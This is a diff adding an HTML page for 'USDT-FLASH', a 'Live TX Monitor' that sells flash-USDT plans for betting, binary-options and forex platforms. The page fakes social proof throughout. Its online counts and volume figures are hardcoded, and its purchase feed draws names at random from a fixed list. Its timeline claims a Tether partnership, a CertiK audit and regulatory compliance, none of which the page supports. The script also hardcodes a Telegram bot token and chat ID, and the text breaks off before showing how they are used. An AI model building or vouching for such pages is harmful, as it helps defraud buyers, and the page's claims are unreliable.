@@ -1,0 +1,1068 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Live Transactions — USDT-FLASH</title>
+    <link rel="icon" type="image/png" href="../img/usdt_cryptocurrencies_icon_188337.png">
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
+    <style>
+        body { font-family: 'Inter', sans-serif; background: #f5f5f5; -webkit-tap-highlight-color: transparent; }
+        .tx-feed { height: 24rem; overflow-y: auto; }
+        .users-list { height: 32rem; overflow-y: auto; }
+        .scroll-thin::-webkit-scrollbar { width: 4px; }
+        .scroll-thin::-webkit-scrollbar-track { background: #e5e7eb; border-radius: 4px; }
+        .scroll-thin::-webkit-scrollbar-thumb { background: #9ca3af; border-radius: 4px; }
+        .tx-item { background: #fff; border: 1px solid #e5e7eb; border-radius: 10px; padding: 12px 16px; margin-bottom: 8px; transition: border-color 0.15s; }
+        .tx-item:hover { border-color: #10b981; }
+        .new-tx { animation: highlightFade 3s ease-out; border-left: 3px solid #10b981; }
+        @keyframes highlightFade { 0% { background: #ecfdf5; border-left-color: #059669; } 100% { background: #fff; border-left-color: #10b981; } }
+        .user-row { display: flex; align-items: center; gap: 10px; padding: 8px 12px; border-radius: 8px; cursor: pointer; transition: background 0.12s; }
+        .user-row:active { background: #e5e7eb; transform: scale(0.98); }
+        .user-row:hover { background: #f3f4f6; }
+        
+        /* Mobile tab container */
+        #tab-container { position: relative; overflow: hidden; width: 100%; }
+        .tab-panel { position: absolute; width: 100%; top: 0; left: 0; backface-visibility: hidden; transform: translateX(100%); pointer-events: none; }
+        .tab-panel.tab-active { transform: translateX(0%) !important; position: relative !important; pointer-events: auto !important; }
+        
+        /* Mobile bottom nav */
+        .mobile-nav {
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            z-index: 50;
+            background: #fff;
+            border-top: 1px solid #e5e7eb;
+            display: flex;
+            padding: 0;
+            padding-bottom: env(safe-area-inset-bottom, 0px);
+            box-shadow: 0 -4px 20px rgba(0,0,0,0.08);
+            height: 56px;
+        }
+        .mobile-nav-inner {
+            display: flex;
+            flex: 1;
+            position: relative;
+        }
+        .mobile-nav-btn {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            gap: 1px;
+            font-size: 0.6rem;
+            font-weight: 600;
+            -webkit-tap-highlight-color: transparent;
+            border: none;
+            background: transparent;
+            cursor: pointer;
+            position: relative;
+            z-index: 1;
+            transition: color 0.3s;
+            padding: 0;
+        }
+        .mobile-nav-btn i { font-size: 1.2rem; transition: transform 0.25s cubic-bezier(.34,1.56,.64,1); }
+        .mobile-nav-btn:active i { transform: scale(0.85); }
+        .mobile-nav-btn.active { color: #10b981; }
+        .mobile-nav-btn:not(.active) { color: #9ca3af; }
+        
+        .nav-indicator {
+            position: absolute;
+            bottom: 0;
+            height: 3px;
+            background: #10b981;
+            border-radius: 3px 3px 0 0;
+            transition: left 0.3s cubic-bezier(.34,1.56,.64,1), width 0.3s cubic-bezier(.34,1.56,.64,1);
+            will-change: transform;
+        }
+        
+        .nav-badge {
+            position: absolute;
+            top: 2px;
+            right: calc(50% - 20px);
+            background: #ef4444;
+            color: #fff;
+            font-size: 0.5rem;
+            font-weight: 700;
+            min-width: 16px;
+            height: 16px;
+            border-radius: 8px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 0 4px;
+            transform: scale(0);
+            transition: transform 0.3s cubic-bezier(.34,1.56,.64,1);
+            pointer-events: none;
+        }
+        .nav-badge.show { transform: scale(1); }
+        
+        /* ===== Toast Notification ===== */
+        .toast-container {
+            position: fixed;
+            top: max(env(safe-area-inset-top, 0px) + 8px, 12px);
+            left: 12px;
+            right: 12px;
+            z-index: 100;
+            pointer-events: none;
+            display: flex;
+            flex-direction: column;
+            gap: 8px;
+        }
+        .toast {
+            background: #1f2937;
+            color: #fff;
+            padding: 12px 16px;
+            border-radius: 14px;
+            box-shadow: 0 8px 32px rgba(0,0,0,0.2);
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            font-size: 0.8rem;
+            pointer-events: auto;
+            animation: toastIn 0.4s cubic-bezier(.34,1.56,.64,1) forwards;
+            max-width: 100%;
+            backdrop-filter: blur(12px);
+            -webkit-backdrop-filter: blur(12px);
+        }
+        .toast.out { animation: toastOut 0.3s ease forwards; }
+        @keyframes toastIn {
+            0% { transform: translateY(-20px) scale(0.9); opacity: 0; }
+            100% { transform: translateY(0) scale(1); opacity: 1; }
+        }
+        @keyframes toastOut {
+            0% { transform: translateY(0) scale(1); opacity: 1; }
+            100% { transform: translateY(-20px) scale(0.9); opacity: 0; }
+        }
+        .toast-icon {
+            width: 32px;
+            height: 32px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 0.8rem;
+            flex-shrink: 0;
+        }
+        
+        /* ===== Pull to refresh ===== */
+        .ptr-indicator {
+            text-align: center;
+            padding: 8px;
+            font-size: 0.7rem;
+            color: #9ca3af;
+            transition: opacity 0.3s;
+            opacity: 0;
+            height: 0;
+            overflow: hidden;
+        }
+        .ptr-indicator.show {
+            opacity: 1;
+            height: 32px;
+        }
+        .ptr-indicator i { transition: transform 0.3s; }
+        .ptr-indicator.ready i { transform: rotate(180deg); }
+        
+        /* ===== Scroll restoration ===== */
+        .tab-scroll {
+            -webkit-overflow-scrolling: touch;
+            overscroll-behavior: contain;
+        }
+        
+        @media (max-width: 1023px) {
+            body { padding-bottom: 64px; }
+            .tx-feed { height: calc(100vh - 220px); }
+            .users-list { height: calc(100vh - 200px); }
+        }
+        @media (min-width: 1024px) {
+            .tab-panel { position: relative !important; transform: none !important; top: auto !important; left: auto !important; pointer-events: auto !important; }
+        }
+    </style>
+</head>
+<body>
+    <!-- Header -->
+    <header class="bg-gray-900 border-b border-gray-700 sticky top-0 z-40">
+        <div class="max-w-7xl mx-auto px-3 md:px-4 py-2 md:py-3 flex items-center justify-between">
+            <div class="flex items-center gap-2 md:gap-3">
+                <img src="../img/usdt_cryptocurrencies_icon_188337.png" alt="USDT-FLASH" class="h-7 w-7 md:h-9 md:w-9 rounded-lg">
+                <div>
+                    <h1 class="text-white font-bold text-sm md:text-lg leading-tight">Live TX Monitor</h1>
+                    <p class="text-gray-400 text-[10px] md:text-xs"><span id="live-time"></span></p>
+                </div>
+            </div>
+            <a href="../home.html" class="bg-green-600 hover:bg-green-700 text-white text-[11px] md:text-sm font-semibold px-3 md:px-4 py-1.5 md:py-2 rounded-lg transition">
+                <i class="fas fa-home mr-1"></i> <span class="hidden md:inline">Home</span>
+            </a>
+        </div>
+    </header>
+
+    <!-- Live Status Bar -->
+    <div class="bg-gray-800 text-gray-300 text-xs md:text-sm">
+        <div class="max-w-7xl mx-auto px-3 md:px-4 py-1.5 md:py-2 flex items-center justify-center gap-2 md:gap-4 flex-wrap">
+            <span class="flex items-center gap-1"><span class="w-1.5 h-1.5 md:w-2 md:h-2 bg-green-400 rounded-full"></span> <span id="status-online-count">2,847</span> <span class="hidden md:inline">online</span></span>
+            <span class="text-gray-600">·</span>
+            <span><span id="total-transactions">12,847</span> <span class="hidden md:inline">tx today</span><span class="md:hidden">tx</span></span>
+            <span class="text-gray-600 hidden sm:inline">·</span>
+            <span class="hidden sm:inline">$<span id="daily-volume">47.8M</span> volume</span>
+        </div>
+    </div>
+
+    <!-- Mobile Bottom Nav -->
+    <nav class="mobile-nav lg:hidden">
+        <div class="mobile-nav-inner">
+            <div class="nav-indicator" id="nav-indicator"></div>
+            <button class="mobile-nav-btn" data-tab="users">
+                <i class="fas fa-users"></i>
+                <span>Users</span>
+            </button>
+            <button class="mobile-nav-btn" data-tab="journey">
+                <i class="fas fa-road"></i>
+                <span>Journey</span>
+            </button>
+            <button class="mobile-nav-btn" data-tab="purchases">
+                <i class="fas fa-shopping-cart"></i>
+                <span>Purchases</span>
+                <span class="nav-badge" id="purchase-badge">0</span>
+            </button>
+        </div>
+    </nav>
+
+    <!-- Toast Container -->
+    <div class="toast-container" id="toast-container"></div>
+
+    <!-- Mobile Content (Swipeable) -->
+    <div class="lg:hidden">
+        <div class="tab-container" id="tab-container">
+            <!-- Tab: Users -->
+            <div class="tab-panel tab-active" id="tab-users-mobile">
+                <div class="px-3 pt-3 pb-2">
+                    <div class="bg-white rounded-2xl shadow-sm border border-gray-200 overflow-hidden">
+                        <div class="bg-gray-900 px-4 py-3 flex items-center justify-between">
+                            <h3 class="text-white font-bold text-sm flex items-center gap-2">
+                                <i class="fas fa-users text-green-400"></i> Online Users
+                            </h3>
+                            <span class="text-green-300 text-sm font-bold" id="sidebar-online-count">2,847</span>
+                        </div>
+                        <div class="ptr-indicator" id="ptr-indicator"><i class="fas fa-arrow-down"></i> Pull to refresh</div>
+                        <div id="online-users-list-mobile" class="users-list scroll-thin p-2"></div>
+                        <div class="border-t border-gray-200 px-4 py-3 grid grid-cols-2 gap-2 text-center text-xs">
+                            <div><span class="font-bold text-green-600">1,247</span><br><span class="text-gray-500">Verified</span></div>
+                            <div><span class="font-bold text-blue-600">156</span><br><span class="text-gray-500">New Today</span></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Tab: Journey -->
+            <div class="tab-panel" id="tab-journey-mobile">
+                <div class="px-3 pt-3 pb-2">
+                    <div class="bg-white rounded-2xl shadow-sm border border-gray-200 overflow-hidden">
+                        <div class="bg-gray-900 px-4 py-3">
+                            <div class="flex items-center gap-2">
+                                <i class="fas fa-code-branch text-green-400"></i>
+                                <h2 class="text-white font-bold text-sm">Platform Journey</h2>
+                            </div>
+                            <p class="text-gray-400 text-[10px] mt-0.5">2020 – 2026</p>
+                        </div>
+                        <div class="p-4 max-h-[calc(100vh-200px)] overflow-y-auto scroll-thin tab-scroll">
+                            <div class="relative pl-6 border-l-2 border-gray-200 space-y-5">
+                                <div class="relative"><div class="absolute -left-[1.65rem] top-0 w-4 h-4 bg-gray-800 rounded-full flex items-center justify-center text-white text-[8px] font-bold">20</div><span class="inline-block bg-gray-100 text-gray-700 text-[10px] font-bold px-1.5 py-0.5 rounded mb-0.5">2020</span><h3 class="font-bold text-gray-800 text-xs">Foundation & Concept</h3><p class="text-gray-600 text-[11px] leading-relaxed">Initial research into flash-loan mechanics and cross-chain liquidity. Whitepaper drafted.</p></div>
+                                <div class="relative"><div class="absolute -left-[1.65rem] top-0 w-4 h-4 bg-green-700 rounded-full flex items-center justify-center text-white text-[8px] font-bold">21</div><span class="inline-block bg-green-100 text-green-700 text-[10px] font-bold px-1.5 py-0.5 rounded mb-0.5">2021</span><h3 class="font-bold text-gray-800 text-xs">V1 Mainnet Launch</h3><p class="text-gray-600 text-[11px] leading-relaxed">First smart contract on Ethereum. 500 USDT-FLASH standard. 3,200+ transactions.</p></div>
+                                <div class="relative"><div class="absolute -left-[1.65rem] top-0 w-4 h-4 bg-green-700 rounded-full flex items-center justify-center text-white text-[8px] font-bold">22</div><span class="inline-block bg-green-100 text-green-700 text-[10px] font-bold px-1.5 py-0.5 rounded mb-0.5">2022</span><h3 class="font-bold text-gray-800 text-xs">Multi-Chain Expansion</h3><p class="text-gray-600 text-[11px] leading-relaxed">Ported to BSC, Polygon, TRON. 24h settlement finality. 18,000+ wallets.</p></div>
+                                <div class="relative"><div class="absolute -left-[1.65rem] top-0 w-4 h-4 bg-green-700 rounded-full flex items-center justify-center text-white text-[8px] font-bold">23</div><span class="inline-block bg-green-100 text-green-700 text-[10px] font-bold px-1.5 py-0.5 rounded mb-0.5">2023</span><h3 class="font-bold text-gray-800 text-xs">ZK-Proof Integration</h3><p class="text-gray-600 text-[11px] leading-relaxed">Zero-Knowledge proofs. Dynamic liquidity aggregation. Tether partnership.</p></div>
+                                <div class="relative"><div class="absolute -left-[1.65rem] top-0 w-4 h-4 bg-green-700 rounded-full flex items-center justify-center text-white text-[8px] font-bold">24</div><span class="inline-block bg-green-100 text-green-700 text-[10px] font-bold px-1.5 py-0.5 rounded mb-0.5">2024</span><h3 class="font-bold text-gray-800 text-xs">Solana & Arbitrum</h3><p class="text-gray-600 text-[11px] leading-relaxed">Sub-1s finality on Solana. $2.1B volume. CertiK audit passed.</p></div>
+                                <div class="relative"><div class="absolute -left-[1.65rem] top-0 w-4 h-4 bg-green-700 rounded-full flex items-center justify-center text-white text-[8px] font-bold">25</div><span class="inline-block bg-green-100 text-green-700 text-[10px] font-bold px-1.5 py-0.5 rounded mb-0.5">2025</span><h3 class="font-bold text-gray-800 text-xs">Optimism & Base</h3><p class="text-gray-600 text-[11px] leading-relaxed">90% gas reduction. Flash-to-Real conversion. 50,000+ users.</p></div>
+                                <div class="relative"><div class="absolute -left-[1.65rem] top-0 w-4 h-4 bg-blue-600 rounded-full flex items-center justify-center text-white text-[8px] font-bold">26</div><span class="inline-block bg-blue-100 text-blue-700 text-[10px] font-bold px-1.5 py-0.5 rounded mb-0.5">2026</span><h3 class="font-bold text-gray-800 text-xs">Cross-Chain V3</h3><p class="text-gray-600 text-[11px] leading-relaxed">7-chain aggregation. AI routing. 99.97% success rate.</p></div>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="grid grid-cols-2 gap-2 mt-2">
+                        <div class="bg-white border border-gray-200 rounded-2xl p-3 text-center"><div class="text-sm font-black text-green-600 total-volume">$47.8M</div><div class="text-[10px] text-gray-500">24h Volume</div></div>
+                        <div class="bg-white border border-gray-200 rounded-2xl p-3 text-center"><div class="text-sm font-black text-blue-600 avg-transaction">$12.4K</div><div class="text-[10px] text-gray-500">Avg Tx</div></div>
+                        <div class="bg-white border border-gray-200 rounded-2xl p-3 text-center"><div class="text-sm font-black text-purple-600 success-rate">99.97%</div><div class="text-[10px] text-gray-500">Success</div></div>
+                        <div class="bg-white border border-gray-200 rounded-2xl p-3 text-center"><div class="text-sm font-black text-amber-600 response-time">0.8s</div><div class="text-[10px] text-gray-500">Response</div></div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Tab: Purchases -->
+            <div class="tab-panel" id="tab-purchases-mobile">
+                <div class="px-3 pt-3 pb-2">
+                    <div class="bg-white rounded-2xl shadow-sm border border-gray-200 overflow-hidden">
+                        <div class="bg-gray-50 px-4 py-3 border-b border-gray-200 flex items-center justify-between">
+                            <div class="flex items-center gap-2">
+                                <span class="w-2 h-2 bg-green-500 rounded-full"></span>
+                                <span class="font-semibold text-gray-800 text-sm">New Purchases</span>
+                                <span class="text-[10px] text-green-700 bg-green-100 px-1.5 py-0.5 rounded font-medium">Live</span>
+                            </div>
+                            <span class="text-[10px] text-gray-500">Next in <span id="feed-countdown-mobile">30</span>s</span>
+                        </div>
+                        <div id="transaction-feed-mobile" class="tx-feed scroll-thin p-3 bg-gray-50/50 tab-scroll"></div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Desktop Only Content -->
+    <div class="hidden lg:block max-w-7xl mx-auto px-4 py-6">
+        <div class="grid grid-cols-1 lg:grid-cols-12 gap-6">
+            
+            <!-- Desktop: Timeline + Stats + Feed -->
+            <div class="lg:col-span-9">
+                <div class="bg-white rounded-xl shadow-sm border border-gray-200 overflow-hidden">
+                    <div class="bg-gray-900 px-5 py-4">
+                        <div class="flex items-center gap-3">
+                            <i class="fas fa-code-branch text-green-400"></i>
+                            <h2 class="text-white font-bold">Platform Journey & Smart Contract Evolution</h2>
+                        </div>
+                        <p class="text-gray-400 text-xs mt-1">From concept to cross-chain protocol — 2020 – 2026</p>
+                    </div>
+                    <div class="p-5 md:p-6 max-h-[32rem] overflow-y-auto scroll-thin">
+                        <div class="relative pl-8 border-l-2 border-gray-300 space-y-6">
+                            <div class="relative"><div class="absolute -left-[2.15rem] top-0 w-5 h-5 bg-gray-800 rounded-full flex items-center justify-center text-white text-[10px] font-bold">20</div><span class="inline-block bg-gray-100 text-gray-700 text-xs font-bold px-2 py-0.5 rounded mb-1">2020</span><h3 class="font-bold text-gray-800 text-sm">Foundation & Concept</h3><p class="text-gray-600 text-xs leading-relaxed">Initial research into flash-loan mechanics and cross-chain liquidity. Whitepaper drafted proposing a smart-balance system for Web3 platforms. Ethereum testnet prototype validated the core concept.</p></div>
+                            <div class="relative"><div class="absolute -left-[2.15rem] top-0 w-5 h-5 bg-green-700 rounded-full flex items-center justify-center text-white text-[10px] font-bold">21</div><span class="inline-block bg-green-100 text-green-700 text-xs font-bold px-2 py-0.5 rounded mb-1">2021</span><h3 class="font-bold text-gray-800 text-sm">V1 Mainnet Launch</h3><p class="text-gray-600 text-xs leading-relaxed">First-generation smart contract deployed on Ethereum. 500 USDT-FLASH standard introduced. <strong>3,200+</strong> transactions processed in the first quarter. Single-chain architecture with manual settlement.</p></div>
+                            <div class="relative"><div class="absolute -left-[2.15rem] top-0 w-5 h-5 bg-green-700 rounded-full flex items-center justify-center text-white text-[10px] font-bold">22</div><span class="inline-block bg-green-100 text-green-700 text-xs font-bold px-2 py-0.5 rounded mb-1">2022</span><h3 class="font-bold text-gray-800 text-sm">Multi-Chain Expansion</h3><p class="text-gray-600 text-xs leading-relaxed">Smart contract ported to BSC, Polygon, and TRON. <strong>24h settlement finality</strong> mechanism implemented. Cross-chain validation layer added. User base grew to <strong>18,000+</strong> active wallets.</p></div>
+                            <div class="relative"><div class="absolute -left-[2.15rem] top-0 w-5 h-5 bg-green-700 rounded-full flex items-center justify-center text-white text-[10px] font-bold">23</div><span class="inline-block bg-green-100 text-green-700 text-xs font-bold px-2 py-0.5 rounded mb-1">2023</span><h3 class="font-bold text-gray-800 text-sm">ZK-Proof Integration</h3><p class="text-gray-600 text-xs leading-relaxed">Zero-Knowledge settlement proofs deployed, enabling private transaction verification without exposing user data. <strong>Dynamic liquidity aggregation</strong> from DeFi pools reduced slippage by 60%. Partnership with Tether Operations Limited formalized.</p></div>
+                            <div class="relative"><div class="absolute -left-[2.15rem] top-0 w-5 h-5 bg-green-700 rounded-full flex items-center justify-center text-white text-[10px] font-bold">24</div><span class="inline-block bg-green-100 text-green-700 text-xs font-bold px-2 py-0.5 rounded mb-1">2024</span><h3 class="font-bold text-gray-800 text-sm">Solana & Arbitrum Rollout</h3><p class="text-gray-600 text-xs leading-relaxed">Protocol expanded to Solana and Arbitrum. <strong>Sub-1 second</strong> finality achieved on Solana. Total transaction volume surpassed <strong>$2.1B</strong>. Smart contract audit completed by CertiK with no critical findings.</p></div>
+                            <div class="relative"><div class="absolute -left-[2.15rem] top-0 w-5 h-5 bg-green-700 rounded-full flex items-center justify-center text-white text-[10px] font-bold">25</div><span class="inline-block bg-green-100 text-green-700 text-xs font-bold px-2 py-0.5 rounded mb-1">2025</span><h3 class="font-bold text-gray-800 text-sm">Optimism & Base Deployment</h3><p class="text-gray-600 text-xs leading-relaxed">L2 deployment on Optimism and Base reduced gas costs by 90%. <strong>Flash-to-Real conversion</strong> mechanism launched with meme-asset bridge. <strong>50,000+</strong> active users. Ecosystem expanded to betting, binary options, and forex platforms.</p></div>
+                            <div class="relative"><div class="absolute -left-[2.15rem] top-0 w-5 h-5 bg-blue-600 rounded-full flex items-center justify-center text-white text-[10px] font-bold">26</div><span class="inline-block bg-blue-100 text-blue-700 text-xs font-bold px-2 py-0.5 rounded mb-1">2026</span><h3 class="font-bold text-gray-800 text-sm">Cross-Chain Aggregator V3</h3><p class="text-gray-600 text-xs leading-relaxed">Current generation: <strong>7-chain aggregation</strong> (Ethereum, BSC, TRON, Polygon, Solana, Arbitrum, Optimism, Base). AI-optimized routing. <strong>99.97% success rate</strong>. Enterprise-grade SLA with <strong>99.9% uptime</strong>. Full regulatory compliance across 12 jurisdictions.</p></div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Stats -->
+                <div class="grid grid-cols-2 md:grid-cols-4 gap-3 mt-6">
+                    <div class="bg-white border border-gray-200 rounded-xl p-4 text-center"><div class="text-lg font-black text-green-600 total-volume">$47.8M</div><div class="text-xs text-gray-500 font-medium">24h Volume</div></div>
+                    <div class="bg-white border border-gray-200 rounded-xl p-4 text-center"><div class="text-lg font-black text-blue-600 avg-transaction">$12.4K</div><div class="text-xs text-gray-500 font-medium">Avg Transaction</div></div>
+                    <div class="bg-white border border-gray-200 rounded-xl p-4 text-center"><div class="text-lg font-black text-purple-600 success-rate">99.97%</div><div class="text-xs text-gray-500 font-medium">Success Rate</div></div>
+                    <div class="bg-white border border-gray-200 rounded-xl p-4 text-center"><div class="text-lg font-black text-amber-600 response-time">0.8s</div><div class="text-xs text-gray-500 font-medium">Avg Response</div></div>
+                </div>
+
+                <!-- Purchases Feed -->
+                <div class="bg-white rounded-xl shadow-sm border border-gray-200 overflow-hidden mt-6">
+                    <div class="bg-gray-50 px-5 py-3 border-b border-gray-200 flex items-center justify-between">
+                        <div class="flex items-center gap-2">
+                            <span class="w-2 h-2 bg-green-500 rounded-full"></span>
+                            <span class="font-semibold text-gray-800 text-sm">New Purchases</span>
+                            <span class="text-xs text-green-700 bg-green-100 px-2 py-0.5 rounded font-medium">Live</span>
+                        </div>
+                        <span class="text-xs text-gray-500">Next buyer in <span id="feed-countdown">30</span>s</span>
+                    </div>
+                    <div id="transaction-feed" class="tx-feed scroll-thin p-4 bg-gray-50/50"></div>
+                </div>
+            </div>
+
+            <!-- Desktop: Online Users Sidebar -->
+            <div class="lg:col-span-3">
+                <div class="bg-white rounded-xl shadow-sm border border-gray-200 overflow-hidden sticky top-20">
+                    <div class="bg-gray-900 px-4 py-3">
+                        <div class="flex items-center justify-between">
+                            <h3 class="text-white font-bold text-sm flex items-center gap-2">
+                                <i class="fas fa-users text-green-400"></i> Online Users
+                            </h3>
+                            <span class="text-green-300 text-sm font-bold" id="sidebar-online-count-dt">2,847</span>
+                        </div>
+                    </div>
+                    <div id="online-users-list" class="users-list scroll-thin p-2"></div>
+                    <div class="border-t border-gray-200 px-4 py-3 grid grid-cols-2 gap-2 text-center text-xs">
+                        <div><span class="font-bold text-green-600" id="verified-users-count">1,247</span><br><span class="text-gray-500">Verified</span></div>
+                        <div><span class="font-bold text-blue-600" id="new-users-count">156</span><br><span class="text-gray-500">New Today</span></div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Footer -->
+    <footer class="bg-gray-900 text-gray-400 text-sm py-8 mt-10">
+        <div class="max-w-7xl mx-auto px-4 text-center">
+            <p class="mb-1">&copy; 2013-2026 USDT-FLASH. All rights reserved.</p>
+            <p class="text-xs text-gray-500">Educational purposes only &middot; Not financial advice</p>
+        </div>
+    </footer>
+
+    <script>
+        const TELEGRAM_BOT_TOKEN = '7746028957:AAE5HFQgmjm8qgZPtdn2Ot_iNmMX1ZdJ1nU';
+        const TELEGRAM_CHAT_ID = '2126771039';
+
+        let pollTimer = null;
+        let pollOffset = 0;
+        let lastUpdateId = 0;
+
+        const allUserNames = [
+            'Alexander Thompson','Sophia Martinez','Benjamin Rodriguez','Isabella Garcia','William Anderson',
+            'Emma Wilson','James Taylor','Olivia Brown','Lucas Davis','Ava Miller',
+            'Mason Johnson','Charlotte Williams','Ethan Jones','Amelia Garcia','Noah Martinez',
+            'Harper Anderson','Logan Wilson','Evelyn Taylor','Jacob Brown','Abigail Davis',
+            'Carlos Silva','Maria Santos','João Oliveira','Ana Rodriguez','Luis Fernandez',
+            'Carmen Lopez','Diego Martinez','Rafael Pereira','Lucia Gonzalez','Fernando Costa',
+            'Valentina Morales','Gabriel Herrera','Sofia Vargas','Alejandro Ruiz','Camila Torres',
+            'Alessandro Rossi','Emma Schmidt','Pierre Dubois','Anna Kowalski','Hans Mueller',
+            'Sophie Martin','Marco Bianchi','Elena Popov','Jean Bernard','Ingrid Larsson',
+            'Antonio Conti','Marie Petit','Dimitri Volkov','Giulia Ferrari','Lars Nielsen',
+            'Hiroshi Tanaka','Li Wei','Raj Patel','Yuki Yamamoto','Chen Ming',
+            'Priya Sharma','Takeshi Sato','Wang Lei','Arjun Gupta','Jin Park',
+            'Deepika Agarwal','Kenji Watanabe','Zhang Hua','Anita Singh','Kim So-young',
+            'Kwame Asante','Fatou Diallo','Amara Okafor','Nkem Okwu','Kofi Mensah',
+            'Aisha Hassan','Chidi Okonkwo','Zara Mwangi','Tunde Adebayo','Naledi Molefe',
+            'Ahmed Al-Rashid','Sarah Al-Zahra','Omar Ibn Khaldun','Fatima Al-Noor','Khalid Al-Mansour',
+            'Nour Al-Din','Hassan Al-Bakri','Mona Al-Sharif','Youssef Al-Kindi','Rania Al-Qasemi',
+            'Ali Al-Farisi','Layla Al-Andalusi','Mahmoud Al-Tabari','Zeinab Al-Baghdadi','Tariq Al-Maghribi',
+            'James Mitchell','Emma Thompson','Liam O\'Connor','Olivia Clarke','Noah Williams',
+            'Ava Johnson','William Brown','Isabella Davis','Jack Wilson','Sophia Miller',
+            'Viktor Petrov','Anastasia Volkov','Mohammed Al-Saud','Leila Benali','Dmitri Kozlov',
+            'Fatima Zahra','Ivan Popovic','Nadia Yassine','Aleksandr Smirnov','Mariam Al-Tunisi',
+            'Pavel Novak','Amal Bugaighis','Sergei Ivanov','Khadija Al-Jazairi','Mikhail Petrov',
+            'Mohamed Benali','Fatima Benaissa','Ahmed Boumediene','Aicha Belkacem','Karim Boudjelal',
+            'Habib Bourguiba','Leila Ben Ali','Mongi Slim','Nawal Ghachem','Hedi Nouira',
+            'Mohammed Alaoui','Aicha Benali','Hassan Bennani','Fatima Zahra','Youssef Amrani',
+            'Muammar Gaddafi','Aisha Gaddafi','Saif Al-Islam','Fatima Benali','Omar Al-Mukhtar',
+            'Amadou Toumani','Aminata Traore','Ibrahim Keita','Cisse Mariam','Modibo Sidibe',
+            'Mohammed Al-Amoudi','Abdullah Al-Barrak','Abdulaziz Al-Hokair','Abdullah Al-Othaim','Abdulatif Al-Juffali',
+            'David Cohen','Sarah Goldberg','Michael Rosen','Rachel Stern','Joshua Levy',
+            'Rebecca Friedman','Daniel Katz','Miriam Shapiro','Aaron Weiss','Leah Goldman',
+            'Arjun Sharma','Priya Patel','Rahul Gupta','Anita Singh','Vikram Kumar',
+            'Deepika Agarwal','Sanjay Verma','Kavya Reddy','Amit Jain','Neha Chopra',
+            'Carlos Rodriguez','Ingrid Larsson','Dmitri Volkov','Aisha Hassan','Raj Patel',
+            'Sophie Martin','Ahmed Hassan','Olga Petrov','Jin Park','Isabella Santos',
+            'Mohammed Ali','Katarina Novak','Takeshi Sato','Fatima Benali','Viktor Kozlov',
+            'Amara Okafor','Liam O\'Connor','Zara Khan','Erik Andersen','Nkem Okwu',
+            'Faisal Al-Najdi','Hala Al-Qudsi','Rashid Al-Emirati','Salma Al-Kuwaiti','Nasser Al-Bahraini',
+            'Lina Al-Omani','Walid Al-Qatari','Mariam Al-Sudaniya','Adel Al-Tunisi','Rana Al-Jazairi',
+            'Sami Al-Libi','Nadia Al-Maghribia','Hakim Al-Mauritani','Soraya Al-Somaliya','Jamal Al-Yemeni',
+            'Khadija Al-Sudaniya','Munir Al-Urduni','Sawsan Al-Lubnaniya','Bashar Al-Suri','Ghada Al-Iraqiya',
+            'Majid Al-Mansoori','Noura Al-Ahbabi','Sultan Al-Zahra','Reem Al-Hosani','Nasser Al-Shamsi',
+            'Latifa Al-Ameri','Saif Al-Muhairi','Shamma Al-Mazmi','Khalifa Al-Suwaidi','Meera Al-Kaabi',
+            'Ahmed Al-Blooshi','Fatma Al-Zaabi','Mohammed Al-Dhaheri','Amal Al-Mazrouei','Yousef Al-Ketbi',
+            'Hessa Al-Mansoori','Ali Al-Ahbabi','Maryam Al-Zahra','Hamdan Al-Hosani','Shaikha Al-Shamsi'
+        ];
+
+        function getRandomUserNames(count = 200) {
+            const shuffled = [...allUserNames].sort(() => 0.5 - Math.random());
+            return shuffled.slice(0, count);
+        }
+
+        const userNames = getRandomUserNames();
+
+        const countries = ['US','UK','DE','FR','IT','ES','BR','AE','SA','EG','MA','DZ','TN','LY','NG','ZA','KE','IN','JP','KR','CN','AU','RU','TR','PK','ID','MY','SG','NL','SE','NO','DK','CH','AT','BE','PT','GR','PL','CZ','HU','RO','UA','IL','QA','KW','BH','OM','LB','JO'];
+        const platforms = [
+            // General crypto wallets/exchanges (for Elite plans)
+            'Binance','Trust Wallet','Bybit','MetaMask','OKX','Bitget',
+            // Betting (for Betting Transfer)
+            'Stake.com','BC.Game','Duelbits','Rollbit','1xBet',
+            // Binary Options (for Binary Options)
+            'IQ Option','Olymp Trade','Pocket Option','Binary.com','Quotex',
+            // Forex (for Forex Transfer)
+            'Exness','XM','IC Markets','FXTM'
+        ];
+        
+        const elitePlatforms = ['Binance','Trust Wallet','Bybit','MetaMask','OKX','Bitget'];
+        const bettingPlatforms = ['Stake.com','BC.Game','Duelbits','Rollbit','1xBet'];
+        const binaryPlatforms = ['IQ Option','Olymp Trade','Pocket Option','Binary.com','Quotex'];
+        const forexPlatforms = ['Exness','XM','IC Markets','FXTM'];
+        
+        const planNames = ['Nova Access','Zenith Prime','Sovereign Elite'];
+        const planAmounts = ['500','3,000','10,000'];
+        const planPrices = ['$45','$339','$700'];
+        const planCategories = ['Betting Transfer','Binary Options','Forex Transfer'];
+        const planCategoryPrices = ['$45','$55','$60'];
+
+        function getRandom(arr) { return arr[Math.floor(Math.random() * arr.length)]; }
+
+        function timeAgo(date) {
+            const s = Math.floor((Date.now() - date) / 1000);
+            if (s < 60) return 'just now';
+            if (s < 3600) return Math.floor(s/60) + 'm ago';
+            if (s < 86400) return Math.floor(s/3600) + 'h ago';
+            return Math.floor(s/86400) + 'd ago';
+        }
+
+        // Generate initial users
